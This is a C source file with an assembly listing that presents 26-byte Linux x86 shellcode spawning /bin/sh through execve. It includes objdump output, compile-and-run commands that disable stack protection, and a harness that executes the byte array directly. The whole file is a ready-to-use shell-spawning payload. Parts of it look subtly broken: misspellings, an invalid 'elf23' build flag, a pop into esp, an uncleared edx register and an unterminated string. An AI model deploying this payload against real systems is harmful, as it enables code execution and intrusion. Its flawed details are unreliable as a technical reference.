/*
*********
$ Infos $
*********
Author: vida
Github: https://github.com/vida00/
Command: excve("/bin/sh", NULL, NULL);
Arch: linux x86
Lenght: 26 bytes

*****************
$ Assembly Code $
*****************
section .text
    global _start
_start:
    jmp getshell
main:
    pop esp
    mov ebx, esp
    xor eax, eax
    mov ecx, eax
    mov al, 0xb
    int 0x80
getshell:
    call main
    db "/bin//sh"

******************
$ objdump result $
******************
08049000 <_start>:
 8049000:       eb 0b                   jmp    804900d <getshell>

08049002 <main>:
 8049002:       5c                      pop    %esp
 8049003:       89 e3                   mov    %esp,%ebx
 8049005:       31 c0                   xor    %eax,%eax
 8049007:       89 c1                   mov    %eax,%ecx
 8049009:       b0 0b                   mov    $0xb,%al
 804900b:       cd 80                   int    $0x80

0804900d <getshell>:
 804900d:       e8 f0 ff ff ff          call   8049002 <main>
 8049012:       2f                      das
 8049013:       62 69 6e                bound  %ebp,0x6e(%ecx)
 8049016:       2f                      das
 8049017:       2f                      das
 8049018:       73 68                   jae    8049082 <getshell+0x75>

*****************
$ Compile & Run $
*****************
Assembly: nasm shellcode.asm -f elf23 && ld shellcode.o -o shellcode -m elf_i386 && ./shellcode
C: gcc shellcode.c -o shellcode -z execstack -m32 && ./shellcode
*/
unsigned char shellcode[] = \
"\xeb\x0b\x5c\x89\xe3\x31\xc0\x89\xc1\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
void main(){
    (*(void(*)()) shellcode)();
}
